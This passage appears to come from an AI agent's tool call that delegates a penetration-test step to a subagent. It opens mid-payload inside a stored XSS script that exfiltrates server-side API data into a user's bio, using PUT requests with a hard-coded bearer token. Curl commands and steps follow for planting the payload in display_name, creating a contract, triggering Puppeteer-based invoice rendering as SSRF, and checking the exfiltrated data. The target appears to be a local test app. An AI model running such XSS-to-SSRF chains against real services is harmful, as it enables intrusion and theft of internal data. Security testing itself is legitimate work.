d-4d55-47af-9ed7-acb6e6de9cc4',{method:'PUT',headers:{'Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjExZDA4NThkLTRkNTUtNDdhZi05ZWQ3LWFjYjZlNmRlOWNjNCIsImVtYWlsIjoieHNzX2F0dGFja2VyQHRlc3QuY29tIiwicm9sZSI6ImNsaWVudCIsIndhbGxldEJhbGFuY2UiOiIwIiwiaWF0IjoxNzc1NjM3NjE0LCJleHAiOjE3NzYyNDI0MTR9.4KfAhI3WvLaiqvHUAO14k1rxo5qUYpSApo9ekLIZBrM','Content-Type':'application/json'},body:JSON.stringify({bio:s})})}).catch(e=>{fetch('http://localhost:3000/api/users/11d0858d-4d55-47af-9ed7-acb6e6de9cc4',{method:'PUT',headers:{'Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjExZDA4NThkLTRkNTUtNDdhZi05ZWQ3LWFjYjZlNmRlOWNjNCIsImVtYWlsIjoieHNzX2F0dGFja2VyQHRlc3QuY29tIiwicm9sZSI6ImNsaWVudCIsIndhbGxldEJhbGFuY2UiOiIwIiwiaWF0IjoxNzc1NjM3NjE0LCJleHAiOjE3NzYyNDI0MTR9.4KfAhI3WvLaiqvHUAO14k1rxo5qUYpSApo9ekLIZBrM','Content-Type':'application/json'},body:JSON.stringify({bio:'ERROR:'+e.message})})})</script>\n\nSTEP 2: Update attacker's display_name with the SSRF payload\ncurl -X PUT \"http://host.docker.internal:3000/api/users/11d0858d-4d55-47af-9ed7-acb6e6de9cc4\" \\\n  -H \"Authorization: Bearer $ATTACKER_JWT\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"display_name\": \"<script>PAYLOAD_HERE</script>\"}'\n\nIMPORTANT: The display_name must contain exactly the script tag payload above. Be careful with JSON escaping.\n\nSTEP 3: Create a new contract where attacker is the client (so display_name is used in invoice)\nPOST /api/contracts:\n{\n  \"client_id\": \"11d0858d-4d55-47af-9ed7-acb6e6de9cc4\",\n  \"freelancer_id\": \"c927afc1-686f-43ec-afa1-be7acc12eac0\",\n  \"title\": \"SSRF Test Contract\",\n  \"description\": \"Test\",\n  \"amount\": 100,\n  \"milestones\": [{\"title\": \"Milestone 1\", \"amount\": 100, \"due_date\": \"2026-05-01\"}]\n}\n\nSTEP 4: Trigger invoice generation (wait up to 45 seconds for response or timeout)\nGET /api/contracts/$NEW_CONTRACT_ID/invoice\nUse curl with timeout 45 seconds: curl --max-time 45 ...\n\nNote: Either the invoice generates (SSRF worked quickly and exfil completed) or it times out (SSRF tried to make network requests, causing networkidle0 timeout). Both prove SSRF.\n\nSTEP 5: Check if bio was updated with the exfiltrated data\ncurl GET /api/auth/me -H \"Authorization: Bearer $ATTACKER_JWT\"\nCheck if bio field contains data from /api/gigs\n\nSTEP 6: If Step 5 shows exfiltrated data, that's Level 4 SSRF proof.\nIf bio is empty/unchanged, the timeout itself is proof of SSRF (Puppeteer made outbound requests, causing networkidle0 to wait).\n\nAlso try: check what the bio shows - it might show internal service data or an error message.\n\nReport:\n- The exact display_name payload used (curl command)\n- HTTP response when updating display_name\n- The new contract_id created\n- HTTP response (or timeout) from the invoice endpoint\n- GET /api/auth/me response showing the bio field\n- Whether exfiltrated data was captured in the bio\n- Overall SSRF confirmation\n\nCRITICAL: Use curl for all HTTP requests. Do NOT use playwright for this step - it's all server-side.","subagent_type":"general-purpose"},"caller":{"type":"direct"}}
